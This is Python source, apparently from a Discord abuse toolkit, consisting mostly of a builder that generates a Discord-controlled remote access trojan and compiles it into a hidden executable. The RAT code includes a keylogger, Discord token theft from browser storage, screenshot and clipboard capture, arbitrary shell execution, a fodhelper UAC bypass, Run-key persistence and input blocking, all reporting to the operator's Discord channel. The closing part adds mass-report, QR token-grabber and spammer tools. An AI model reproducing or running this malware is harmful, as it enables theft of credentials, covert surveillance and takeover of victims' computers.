from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

from discord_components import *

from discord.ext import commands
from discord_slash.context import ComponentContext
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component

client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\\'s')
slash = SlashCommand(client, sync_commands=True)

token = '~~TOKENHERE~~'

@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('You do not have permission to execute this command')
    else:
        print(error)

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        country = data['country']
        city = data['city']

    process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    wtype = process2.communicate()[0].decode().strip("Caption\\n").strip()

    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here ✔ New session, opened **{channel_name}** | **{wtype}** | **{ip}, {country}/{city}**\\n> Succesfully gained access to user **`{os.getlogin()}`**"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)


@slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    for y in range(len(on_ready.total)): 
        if "session" in on_ready.total[y]:
            channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
            await channel_to_delete.delete()
        else:
            pass
    await ctx.send(f"Killed all the inactive sessions")


@slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.RED,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="X"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "✔":
            await ctx.send(content="Exited the program!", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled the exit", hidden=True)


@slash.slash(name="info", description="gather info about the user", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
        googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\\n").strip()
        process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wtype = process2.communicate()[0].decode().strip("Caption\\n").strip()

        userdata = f"```fix\\n------- {os.getlogin()} -------\\nComputername: {os.getenv('COMPUTERNAME')}\\nIP: {data['ip']}\\nUsing VPN?: {UsingVPN}\\nOrg: {data['org']}\\nCity: {data['city']}\\nRegion: {data['region']}\\nPostal: {data['postal']}\\nWindowskey: {wkey}\\nWindows Type: {wtype}\\n```**Map location: {googlemap}**\\n"
        await ctx.send(userdata)


@slash.slash(name="startkeylogger", description="start a key logger on their pc", guild_ids=g)
async def startKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                level=logging.DEBUG, format='%%(asctime)s: %%(ctx)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            global logger
            logger = threading.Thread(target=keylog)
            logger._running = True
            logger.daemon = True
            logger.start()
            await ctx.send("Keylogger Started!")


@slash.slash(name="stopkeylogger", description="stop the key logger", guild_ids=g)
async def stopKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        logger._running = False
        await ctx.send("Keylogger Stopped!")


@slash.slash(name="KeyLogDump", description="dumb the keylogs", guild_ids=g)
async def KeyLogDump_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        file_keys = os.path.join(os.getenv("TEMP") + "\\key_log.txt")
        file = discord.File(file_keys, filename=file_keys)
        await ctx.send("Successfully dumped all the logs", file=file)
        os.remove(file_keys)


@slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
async def TokenExtractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"extracting tokens...")
        tokens = []
        saved = ""
        paths = {
            'Discord': os.getenv('APPDATA') + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',
            'Discord Canary': os.getenv('APPDATA') + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',
            'Lightcord': os.getenv('APPDATA') + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',
            'Discord PTB': os.getenv('APPDATA') + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',
            'Opera': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',
            'Opera GX': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',
            'Amigo': os.getenv('LOCALAPPDATA') + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Torch': os.getenv('LOCALAPPDATA') + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Kometa': os.getenv('LOCALAPPDATA') + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Orbitum': os.getenv('LOCALAPPDATA') + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            '7Star': os.getenv('LOCALAPPDATA') + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Sputnik': os.getenv('LOCALAPPDATA') + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Chrome': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',
            'Uran': os.getenv('LOCALAPPDATA') + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Yandex': os.getenv('LOCALAPPDATA') + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Brave': os.getenv('LOCALAPPDATA') + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Iridium': os.getenv('LOCALAPPDATA') + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'
        }
        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        for token in tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                "Authorization": token
            })
            if r.status_code == 200:
                if token in saved:
                    continue
                saved += f"`{token}`\\n\\n"
        if saved != "":
            await ctx.send(f"**Token(s) succesfully grabbed:** \\n{saved}")
        else:
            await ctx.send(f"**User didn't have any stored tokens**")


@slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
async def windowstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = False

        threading.Thread(target=between_callback, args=(client,)).start()
        await ctx.send("Window logging for this session started")


@slash.slash(name="windowstop", description="stop window logger", guild_ids=g)
async def windowstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = True

        await ctx.send("Window logging for this session stopped")
        game = discord.Game(f"Window logging stopped")
        await client.change_presence(status=discord.Status.online, activity=game)


def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)

def get_dims(cap, res='1080p'):
    STD_DIMENSIONS =  {
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width,height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height

@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        temp = os.path.join(os.getenv('TEMP') + "\\\\monitor.png")
        with mss() as sct:
            sct.shot(output=temp)
        file = discord.File(temp, filename="monitor.png")
        await ctx.send("Screenshot taken!", file=file)
        os.remove(temp)


@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MaxVolume()
        await ctx.send("Volume set to **100%**")


@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MuteVolume()
        await ctx.send("Volume set to **0%**")


@slash.slash(name="Wallpaper", description="Change their wallpaper", guild_ids=g)
async def Wallpaper_command(ctx: SlashContext, link: str):
    if ctx.channel.name == channel_name:
        if re.match(r'^(?:http|ftp)s?://', link) is not None:
            image_formats = ("image/png", "image/jpeg", "image/jpg", "image/x-icon",)
            r = requests.head(link)
            if r.headers["content-type"] in image_formats:
                path = os.path.join(os.getenv('TEMP') + "\\\\temp.jpg")
                urlretrieve(link, path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                await ctx.send(f"Successfully Changed their wallpaper to:\\n{link}")
            else:
                await ctx.send("Link needs to be a url to an image!")
        else:
            await ctx.send("Invalid link!")


@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        def shell():
            output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            return output

        shel = threading.Thread(target=shell)
        shel._running = True
        shel.start()
        sleep(1)
        shel._running = False

        result = str(shell().stdout.decode('CP437'))
        numb = len(result)

        if result != "":
            if numb < 1:
                await ctx.send("unrecognized command or no output was obtained")
            elif numb > 1990:
                f1 = open("output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File("output.txt", filename="output.txt")

                await ctx.send("Command successfully executed", file=file)
                os.remove("output.txt")
            else:
                await ctx.send(f"Command successfully executed:\\n```\\n{result}```")
        else:
            await ctx.send("unrecognized command or no output was obtained")

@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Typing. . .")
        for letter in message:
            pyautogui.typewrite(letter);sleep(0.0001)
        await ctx.send(f"Done typing\\n```\\n{message}```")


@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"Their Current Clipboard is:\\n```{data}```")


@slash.slash(name="AdminCheck", description=f"check if DiscordRAT has admin perms", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            embed = discord.Embed(title="AdminCheck", description=f"DiscordRAT Has Admin privileges!")
            await ctx.send(embed=embed)
        else:
            embed=discord.Embed(title="AdminCheck",description=f"DiscordRAT does not have admin privileges")
            await ctx.send(embed=embed)


@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [
                ('cbSize', ctypes.c_uint),
                ('dwTime', ctypes.c_int),
            ]
        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                return millis / 1000
            else:
                return 0
        duration = get_idle_duration()
        await ctx.send(f"**{os.getlogin()}'s** been idle for {duration} seconds.")


@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")


@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")
            

@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        def msgbox(message, type):
            return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)

        select = create_select(
        options=[
            create_select_option(label="Error", value="Errors", emoji="X"),
            create_select_option(label="Warning", value="Warnings", emoji="⚠"),
            create_select_option(label="Info", value="Infos", emoji="ℹ"),
            create_select_option(label="Question", value="Questions", emoji="?"),
        ],
        placeholder="Choose your type", 
        min_values=1,
        max_values=1,
    )   
        await ctx.send("What type of messagebox do you want to popup?", components=[create_actionrow(select)])

        select_ctx: ComponentContext = await wait_for_component(client, components=[create_actionrow(select)])
        if select_ctx.selected_options[0] == 'Errors':
            threading.Thread(target=msgbox, args=(message, 16)).start()
            await select_ctx.edit_origin(content=f"Sent an Error Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Warnings':
            threading.Thread(target=msgbox, args=(message, 48)).start()
            await select_ctx.edit_origin(content=f"Sent an Warning Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Infos':
            threading.Thread(target=msgbox, args=(message, 64)).start()
            await select_ctx.edit_origin(content=f"Sent an Info Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Questions':
            threading.Thread(target=msgbox, args=(message, 32)).start()
            await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")


@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
async def Play_command(ctx: SlashContext, youtube_link: str):
    if ctx.channel.name == channel_name:
        MaxVolume()
        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
        else:
            await ctx.send("Invalid Youtube Link")

@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
async def Stop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        ctx.send("stopped the music")
        os.system(f"taskkill /F /IM {pid_process[1]}")


@slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
async def AdminForce_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"attempting to get admin privileges. . .")
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == False:
            os.system(\"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force\""")
            os.system(\"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force\""") 
            os.system(\"""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start\""" + sys.argv[0] +"-Force")
            
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            with disable_fsr():
                os.system("fodhelper.exe")

            sleep(2)
            os.system(\"""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force\""")
        else:
            await ctx.send("You already have admin privileges")


@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
async def Startup_command(ctx: SlashContext, reg_name: str):
    if ctx.channel.name == channel_name:
        try:
            key1 = winreg.HKEY_CURRENT_USER
            key_value1 ="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)

            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
            open_.Close()
            await ctx.send("Successfully added it to `run` startup")
        except PermissionError:
            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+os.path.basename(sys.argv[0]))
            await ctx.send("Permission was denied, added it to `startup folder` instead")

client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid + "]"))


    except Exception as e:
        print(f"""\n\n\n\n {Fore.RED}[{Fore.YELLOW}INFO{Fore.RED}] {Fore.YELLOW} Error writing file: {e}""")
        clear()

    print(f"""\n\n\n {Fore.YELLOW}[{Fore.YELLOW}INFO{Fore.YELLOW}] {Fore.YELLOW}File has been correctly written to "output/{fileName}.py" """)
    convert = input(f""" {Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Convert your script into an executable {Fore.RED}({Fore.YELLOW}Y{Fore.RED}/{Fore.YELLOW}N{Fore.RED}){Fore.YELLOW}? : """)
    if convert.upper() == 'Y' or convert.upper() == 'YES':
        try:
            time.sleep(1)
            clear()

            print(f' {Fore.YELLOW}[{Fore.YELLOW}INFO{Fore.YELLOW}] {Fore.YELLOW}File creation...')
            time.sleep(1)
            os.system(f"pyinstaller --onefile --noconsole -y -F -w output/{fileName}.py")
            clear()
            print(f' {Fore.YELLOW}[{Fore.YELLOW}INFO{Fore.YELLOW}] {Fore.YELLOW}Cleaning up old files...')
            time.sleep(1)
            try:
                import shutil
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.move(f"output/dist/{fileName}.exe", "output")
                shutil.rmtree(f"output/dist")
                time.sleep(1)
            except:
                pass
            clear()
            print(f" {Fore.YELLOW}[{Fore.YELLOW}INFO{Fore.YELLOW}] {Fore.YELLOW}The executable file has been correctly generated")
        except:
            clear()
            print(f" {Fore.YELLOW}[{Fore.YELLOW}INFO{Fore.YELLOW}] {Fore.YELLOW}The executable file has been correctly generated")

  def massreport():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Mass Report") 
    print(f"""
{Fore.RED}
  ███▄ ▄███▓ ▄▄▄       ██████   ██████      ██▀███  ▓█████ ██▓███   ▒█████   ██▀███  ▄▄▄█████▓
 ▓██▒▀█▀ ██▒▒████▄   ▒██    ▒ ▒██    ▒     ▓██ ▒ ██▒▓█   ▀▓██░  ██ ▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒
 ▓██    ▓██░▒██  ▀█▄ ░ ▓██▄   ░ ▓██▄       ▓██ ░▄█ ▒▒███  ▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░
 ▒██    ▒██ ░██▄▄▄▄██  ▒   ██▒  ▒   ██▒    ▒██▀▀█▄  ▒▓█  ▄▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ 
▒▒██▒   ░██▒ ▓█   ▓██▒██████▒▒▒██████▒▒    ░██▓ ▒██▒░▒████▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ 
░░ ▒░   ░  ░ ▒▒   ▓▒█▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░    ░ ▒▓ ░▒▓░░░ ▒░ ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   
░░  ░      ░  ░   ▒▒ ░ ░▒  ░  ░ ░▒  ░        ░▒ ░ ▒░ ░ ░  ░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░    ░    
 ░      ░     ░   ▒  ░  ░  ░  ░  ░  ░         ░   ░    ░  ░░       ░ ░ ░ ▒     ░   ░   ░ ░    
░       ░         ░        ░        ░         ░        ░               ░ ░     ░              

        """)
    print(f"{Fore.RED}({Fore.YELLOW}the token you enter is the account that will send the reports{Fore.RED})")
    token = input(
        f' {Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Token:{Fore.YELLOW} ')
    validateToken(token)
    guild_id1 = str(input(
        f' {Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Server ID:{Fore.YELLOW} '))
    channel_id1 = str(input(
        f' {Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Salon ID:{Fore.YELLOW} '))
    message_id1 = str(input(
        f' {Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Message ID:{Fore.YELLOW} '))
    reason1 = str(input(f"""
        '{Fore.RED}[{Fore.YELLOW}1{Fore.RED}] {Fore.YELLOW}Illegal content'
        '{Fore.RED}[{Fore.YELLOW}2{Fore.RED}] {Fore.YELLOW}Harassment'
        '{Fore.RED}[{Fore.YELLOW}3{Fore.RED}] {Fore.YELLOW}Spam or phishing link'
        '{Fore.RED}[{Fore.YELLOW}4{Fore.RED}] {Fore.YELLOW}Self-harm'
        '{Fore.RED}[{Fore.YELLOW}5{Fore.RED}] {Fore.YELLOW}NSFW content'
        ' {Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Reason: """))
    if reason1.upper() in ('1', 'Illegal content'):
        reason1 = 0
    elif reason1.upper() in ('2', 'Harassment'):
        reason1 = 1
    elif reason1.upper() in ('3', 'Spam or phishing link'):
        reason1 = 2
    elif reason1.upper() in ('4', 'Self-harm'):
        reason1 = 3
    elif reason1.upper() in ('5', 'NSFW content'):
        reason1 = 4
    else:
        print(f"\nInvalid reason")
        sleep(1)
        main()
    utilities.Plugins.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)

  def qrcode():
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Qr Grabber")
    cls()
    print(f"""
{Fore.RED}
  █████   ██▀███         ▄████  ██▀███   ▄▄▄       ▄▄▄▄     ▄▄▄▄   ▓█████ ██▀███  
▒██▓  ██ ▓██ ▒ ██▒    ▒ ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄  ▓█████▄ ▓█   ▀▓██ ▒ ██▒
▒██▒  ██░▓██ ░▄█ ▒    ░▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██ ▒██▒ ▄██▒███  ▓██ ░▄█ ▒
░██  █▀ ░▒██▀▀█▄      ░░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀   ▒██░█▀  ▒▓█  ▄▒██▀▀█▄  
░▒███▒█▄ ░██▓ ▒██▒    ░▒▓███▀▒░░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓▒░▓█  ▀█▓░▒████░██▓ ▒██▒
░░ ▒▒░ ▒ ░ ▒▓ ░▒▓░     ░▒   ▒  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░░▒▓███▀▒░░ ▒░ ░ ▒▓ ░▒▓░
 ░ ▒░  ░   ░▒ ░ ▒░      ░   ░    ░▒ ░ ▒░  ░   ▒▒ ░▒░▒   ░ ░▒░▒   ░  ░ ░    ░▒ ░ ▒░
   ░   ░    ░   ░     ░ ░   ░ ░   ░   ░   ░   ▒    ░    ░   ░    ░    ░     ░   ░ 
    ░       ░               ░     ░           ░  ░ ░      ░ ░         ░     ░     

    """)
    WebHook = input(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Webhook URL: ')
    validateWebhook(WebHook)
    utilities.Plugins.QR_grabber.QR_grabber(WebHook)   

  def groupchatspammer():
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Group Spammer")
    cls()
    print(f"""
{Fore.RED}
 ▄████  ██▀███   ▒█████   █    ██  ██▓███        ██████  ██▓███   ▄▄▄      ███▄ ▄███▓ ███▄ ▄███▓ ▓█████ ██▀███  
 ██▒ ▀█▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓██░  ██     ▒██    ▒ ▓██░  ██ ▒████▄   ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒ ▓█   ▀▓██ ▒ ██▒
▒██░▄▄▄▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▓██░ ██▓▒    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄ ▓██    ▓██░▓██    ▓██░ ▒███  ▓██ ░▄█ ▒
░▓█  ██▒██▀▀█▄  ▒██   ██░▓▓█  ░██░▒██▄█▓▒ ▒      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██▒██    ▒██ ▒██    ▒██  ▒▓█  ▄▒██▀▀█▄  
▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒▒█████▓ ▒██▒ ░  ░    ▒██████▒▒▒██▒ ░  ░▒▓█   ▓██▒██▒   ░██▒▒██▒   ░██▒▒░▒████░██▓ ▒██▒
